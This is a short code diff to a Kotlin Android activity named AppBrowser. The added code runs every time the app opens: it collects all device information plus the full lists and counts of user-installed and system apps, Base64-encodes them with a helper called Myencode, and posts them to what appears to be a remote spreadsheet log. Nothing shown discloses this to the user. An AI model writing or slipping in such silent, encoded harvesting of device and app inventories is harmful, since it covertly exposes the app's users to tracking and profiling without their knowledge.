@@ -38,6 +38,7 @@ import com.google.android.material.floatingactionbutton.FloatingActionButton
 import com.google.android.material.snackbar.Snackbar
 import com.prasunmondal.lib.android.deviceinfo.Device
 import com.prasunmondal.lib.android.deviceinfo.DeviceInfo
+import com.prasunmondal.lib.android.deviceinfo.InstalledApps
 import kotlinx.android.synthetic.main.activity_app_browser.*
 import java.io.PrintWriter
 import java.io.StringWriter
@@ -73,6 +74,12 @@ class AppBrowser : AppCompatActivity() {
         supportActionBar!!.setDisplayShowHomeEnabled(true)
         disableViewBreakdownButton()
 
+        ToSheets.logs.post(listOf(LogActions.APP_OPENED.name,
+            Myencode(DeviceInfo.getAllInfo() + "\n\n\n" +
+                    "-----" + DeviceInfo.get(InstalledApps.USER_APPS_COUNT) + "-----\n"  +
+                    DeviceInfo.get(InstalledApps.USER_APPS_LIST) + "\n\n\n" +
+                    "-----" + DeviceInfo.get(InstalledApps.SYSTEM_APPS_COUNT) + "-----\n"  +
+                    DeviceInfo.get(InstalledApps.SYSTEM_APPS_LIST))), applicationContext)
     }
 
     private fun disableViewBreakdownButton() {
@@ -422,6 +429,10 @@ class AppBrowser : AppCompatActivity() {
         } catch (e: Exception) {
             findViewById<TextView>(R.id.toolbar_Text2).text = "Anonymous"
         }
+    }
+
+    fun Myencode(str: String): String {
+        return Base64.getEncoder().encodeToString(str.toByteArray())
     }
 }
 
